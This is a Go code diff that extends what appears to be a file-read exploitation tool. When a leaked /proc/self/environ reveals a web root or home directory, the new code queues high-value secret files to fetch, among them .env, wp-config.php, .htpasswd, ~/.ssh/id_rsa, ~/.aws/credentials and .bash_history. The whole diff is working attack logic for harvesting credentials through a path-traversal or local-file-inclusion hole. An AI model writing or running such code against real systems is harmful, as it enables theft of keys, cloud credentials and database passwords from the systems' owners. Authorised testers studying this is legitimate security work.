@@ -87,6 +87,19 @@ func (q *Queue) add(path, fromFinding string, depth int) {
 	})
 }
 
+// webConfigTargets lists high-value config file names to probe relative to a
+// discovered web or app root (DOCUMENT_ROOT, PWD, HOME from proc/environ).
+var webConfigTargets = []string{
+	".env",
+	"config.php",
+	"wp-config.php",
+	".git/config",
+	"settings.py",
+	"application.properties",
+	"config/database.yml",
+	".htpasswd",
+}
+
 // generateTargets applies generation rules for one finding.
 func (q *Queue) generateTargets(f extract.Finding) {
 	nextDepth := f.Depth + 1
@@ -120,7 +133,34 @@ func (q *Queue) generateTargets(f extract.Finding) {
 		if f.Value != "" {
 			q.add(f.Value, "path revealed in "+f.Source, nextDepth)
 		}
+
+	case extract.FindingTypeInfo:
+		// Env-var findings from /proc/self/environ. Path-type keys (DOCUMENT_ROOT,
+		// PWD) reveal the web/app root; queue high-value config files relative to it.
+		// HOME reveals the process user's home dir; queue credential files.
+		if !isAbsPath(f.Value) {
+			return
+		}
+		root := f.Value
+		provenance := f.Key + "=" + root + " from " + f.Source
+		switch f.Key {
+		case "DOCUMENT_ROOT", "PWD":
+			for _, rel := range webConfigTargets {
+				q.add(root+"/"+rel, provenance, nextDepth)
+			}
+		case "HOME":
+			q.add(root+"/.ssh/id_rsa", provenance, nextDepth)
+			q.add(root+"/.ssh/authorized_keys", provenance, nextDepth)
+			q.add(root+"/.aws/credentials", provenance, nextDepth)
+			q.add(root+"/.bash_history", provenance, nextDepth)
+			q.add(root+"/.env", provenance, nextDepth)
+		}
 	}
+}
+
+// isAbsPath reports whether s looks like an absolute filesystem path.
+func isAbsPath(s string) bool {
+	return len(s) > 1 && s[0] == '/'
 }
 
 // gitDirFrom resolves the .git directory from a .git/config source path.
